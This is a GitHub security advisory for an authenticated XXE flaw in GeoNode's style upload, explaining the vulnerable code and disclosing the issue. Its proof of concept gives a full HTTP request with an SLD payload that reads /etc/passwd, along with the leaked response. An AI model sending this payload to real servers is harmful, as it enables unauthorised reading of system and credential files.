# [H] GeoServer style upload functionality vulnerable to XML External Entity (XXE) injection

## Summary
Severity: High
Advisory: GHSA-mcmc-c59m-pqq8
CVE: CVE-2023-26043
CWE: CWE-611
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-08-30
Source: https://github.com/advisories/GHSA-mcmc-c59m-pqq8
Type: github-advisory

## Affected
- PyPI: `GeoNode` — affected >=0 <4.0.3

## Details
### Summary
GeoNode is vulnerable to an XML External Entity (XXE) injection in the style upload functionality of GeoServer leading to Arbitrary File Read.

### Details
GeoNode's GeoServer has the ability to upload new styles for datasets through the [`dataset_style_upload` view](https://github.com/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/urls.py#L70-L72).

```py
# https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/views.py#L158-L159
@login_required
def dataset_style_upload(request, layername):
    def respond(*args, **kw):
        kw['content_type'] = 'text/html'
        return json_response(*args, **kw)
    ...
    sld = request.FILES['sld'].read() # 1
    sld_name = None
    try:
        # Check SLD is valid
        ...
        sld_name = extract_name_from_sld(gs_catalog, sld, sld_file=request.FILES['sld']) # 2
    except Exception as e:
        respond(errors=f"The uploaded SLD file is not valid XML: {e}")
    name = data.get('name') or sld_name
    set_dataset_style(layer, data.get('title') or name, sld)
    return respond(
        body={
            'success': True,
            'style': data.get('title') or name, # 3
            'updated': data['update']})
```

`dataset_style_upload` gets a user-provided file (`1`), pass it to `extract_name_from_sld` to extract an element from it (`2`) and return the former in the response (`3`).

```py
# https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/helpers.py#L233-L234
def extract_name_from_sld(gs_catalog, sld, sld_file=None):
    try:
        if sld:
            if isfile(sld):
                with open(sld, "rb") as sld_file:
                    sld = sld_file.read() # 1
            if isinstance(sld, str):
                sld = sld.encode('utf-8')
            dom = etree.XML(sld) # 2
        ...
    named_dataset = dom.findall(
        "{http://www.opengis.net/sld}NamedLayer")
    el = None
    if named_dataset and len(named_dataset) > 0:
        user_style = named_dataset[0].findall("{http://www.opengis.net/sld}UserStyle")
        if user_style and len(user_style) > 0:
            el = user_style[0].findall("{http://www.opengis.net/sld}Name") # 3
    ...
    return el[0].text # 4
```

`extract_name_from_sld` uses `sld` (which is a path to the provided file), reads it (`1`) and parses it with [`etree.XML`](https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1312) in `2`. Since the former uses a [default XMLParser](https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1323-L1324), the parsing gets done with the [`resolve_entities` flag set to `True`](https://lxml.de/api/lxml.etree.XMLParser-class.html#:~:text=resolve_entities%3DTrue). Therefore, `dom` handles the parsed XML containing the resolved entity (`2`), gets `NamedLayer.UserStyle.Name` in `3` and returns the resolved content in `4`.

### PoC
1. Create a guest/non-privileged account and log in.
1. Upload a dataset through `/catalogue/#/upload/dataset` whose name we will be referencing as `<DATASET_NAME>`.
1. Send the following request that will try to upload a new style for the dataset. The response will be returning the resolved entity with the contents of `/etc/passwd`:

```
POST /gs/geonode:<DATASET_NAME>/style/upload HTTP/1.1
Host: localhost
Cookie: django_language=en-us; csrftoken=<CSRF-TOKEN>; sessionid=<SESSION-COOKIE>
X-Csrftoken: <CSRF-TOKEN>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfoo
Content-Length: 485
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="layerid"
1
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="sld"; filename="foo.sld"
Content-Type: application/octet-stream
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY ent SYSTEM "/etc/passwd" > ]>
<foo xmlns="http://www.opengis.net/sld">
  <NamedLayer>
    <UserStyle>
    	<Name>&ent;</Name>
    </UserStyle>
  </NamedLayer>
</foo>
------WebKitFormBoundaryfoo--
```

Sample response:

```
HTTP/1.1 200 OK
Server: nginx/1.23.2
...
{"success": true, "style": "root:x:0:0:root:/root:/bin/bash...", "updated": false}
```


### Impact
This issue may lead to authenticated `Arbitrary File Read`.

## References
- https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8
- https://nvd.nist.gov/vuln/detail/CVE-2023-26043
- https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0
- https://github.com/GeoNode/geonode
- https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml
